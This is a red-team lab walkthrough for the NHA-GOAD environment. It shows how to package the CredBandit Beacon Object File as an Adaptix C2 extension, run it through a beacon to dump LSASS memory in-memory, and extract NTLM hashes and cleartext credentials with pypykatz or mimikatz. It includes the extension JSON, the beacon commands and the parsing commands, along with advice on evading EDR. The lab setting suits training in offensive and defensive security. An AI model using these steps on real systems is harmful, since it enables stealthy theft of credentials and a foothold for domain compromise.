# 11  Adaptix C2 in Action: Stealthy Credential Dumping with a BOF Extension

This guide accompanies the **eleventh** in your series, demonstrating how to stealthily dump all user credentials from SQL Server 1 in the NHA-GOAD lab using a Beacon Object File (BOF) via Adaptix C2. You’ll prepare and load the BOF as a JSON extension, execute it through your active beacon running as `localuser`, and extract both local and domain hashes. Next, you’ll use these credentials to enumerate the domain with BloodHound.

---

> [!WARNING]  
> **OPSEC ALERT: Why Use a BOF for Credential Dumping?**
> 
> - **BOFs (Beacon Object Files) execute in-memory within the beacon process,** avoiding new process creation and minimizing forensic artifacts.
>     
> - This approach is highly stealthy and preferred in environments with advanced EDR (like Elastic EDR), as it reduces detection risk compared to traditional tools (e.g., mimikatz, procdump).
>     
> - **BOFs are single-threaded and must be used carefully,** but they are the red team standard for sensitive operations.
>     
> - Always test BOFs in a lab before using in production to avoid crashing your beacon.
>     
> 
> **Recommendation:**  
> Use BOFs for credential access only when necessary and in controlled environments. Assume defenders may still detect in-memory operations via advanced EDR telemetry.

---

## Key Takeaways

- Download and compile a public credential-dumping BOF (e.g., CredBandit).
    
- Create a JSON extension for the BOF, defining its command and argument structure for Adaptix C2.
    
- Load the extension JSON into Adaptix C2.
    
- Use your active beacon on SQL Server to execute the BOF and dump LSASS memory.
    
- Download the minidump and extract hashes locally.
    
- Identify domain vs. local hashes for further operations.
    
- (Preview) Use recovered domain credentials for BloodHound enumeration in the next phase.
    

---

## Step-by-Step Credential Dumping Guide

## 1. Download and Compile CredBandit BOF

On Kali, clone the CredBandit repository and see the compiled the BOF:

```bash
git clone https://github.com/xforcered/CredBandit.git 
cd CredBandit
cd credBandit 
```
![](../../05%20Images/Pasted%20image%2020250523104430.png)

_Adjust compilation commands as needed per your environment._

## 2. Create the Adaptix Extension JSON for the BOF

Create a JSON file named `credbandit.json` with the following content:

```json
{
  "name": "CredBandit-BOF",
  "description": "Stealthy LSASS minidump using CredBandit BOF.",
  "extensions": [
    {
      "type": "command",
      "agents": ["beacon"],
      "command": "credbandit",
      "description": "Dump LSASS memory in-memory using CredBandit BOF. Provide the LSASS PID.",
      "message": "BOF implementation: credbandit",
      "example": "credbandit 612",
      "args": [
        "INT <pid> (LSASS process ID)"
      ],
      "exec": "execute bof $EXT_DIR()/credBandit.$ARCH().o $PACK_BOF(INT {pid})"
    }
  ]
}
```

- This JSON defines the `credbandit` command for Adaptix C2, matching the BOF’s argument structure.
    
- Ensure the `.o` file (`credbandit.x64.o`) is in the same directory referenced by `$EXT_DIR()`.
    
![](../../05%20Images/Pasted%20image%2020250523104555.png)

## 3. Upload the Extension JSON to Adaptix C2

- Open AdaptixClient and navigate to the Extensions management section.
    
- Upload your `credbandit.json` file via the context menu in the extensions table.
    
- The JSON extension registers the command; Adaptix will load the BOF `.o` file from the extension directory when executed.
    

## 4. Identify the LSASS Process ID

In your active beacon session, run:

```shell
shell tasklist /v 
```
![](../../05%20Images/Pasted%20image%2020250523104111.png)

Locate the PID for `lsass.exe`, , see image above

```shell
lsass.exe     640   
```

## 5. Execute the BOF to Dump LSASS

Run the BOF command in your beacon session:

```shell
credbandit 640
```

Replace `612` with the actual LSASS PID.

The BOF will create an in-memory LSASS minidump and exfiltrate it via the beacon channel.

## 6. Extract Hashes from the Minidump

On Kali, parse the dump using pypykatz or mimikatz:

```shell
pypykatz lsa minidump /path/to/lsass.dmp
```

Or with mimikatz:

```shell
sekurlsa::minidump lsass.dmp sekurlsa::logonpasswords
```

Review the output for usernames, NTLM hashes, and cleartext credentials.

## 7. Identify Domain and Local Credentials

- Domain accounts appear as `DOMAIN\username`.
    
- Local accounts appear as `SQL\localuser` or similar.
    
- Record domain hashes/credentials for the next phase.
    

---

## Tools Used

- Adaptix C2: For extension management and agent control.
    
- CredBandit: Public BOF for in-memory LSASS dumping.
    
- pypykatz/mimikatz: Tools for parsing LSASS minidumps.
    
- Kali Linux: Operator VM for C2 and analysis.
    

---

## References

- [Adaptix Framework - BOF and Extensions](https://adaptix-framework.gitbook.io/adaptix-framework/adaptix-c2/bof-and-extensions)
    
- [CredBandit GitHub](https://github.com/xforcered/CredBandit)
    
- [pypykatz](https://github.com/skelsec/pypykatz)
    
- [mimikatz](https://github.com/gentilkiwi/mimikatz)
    

---

> **Next Steps:** In the next writeup, you’ll use the recovered domain credentials to authenticate and enumerate Active Directory with BloodHound, mapping attack paths for lateral movement and privilege escalation.

---

**TL;DR:**  
Prepare a JSON extension for your BOF (e.g., CredBandit), upload the JSON to Adaptix C2, and use your beacon to execute the credential dump. Extract domain hashes, then leverage them for domain enumeration with BloodHound in the next phase. This method maximizes stealth and effectiveness in EDR-heavy environments.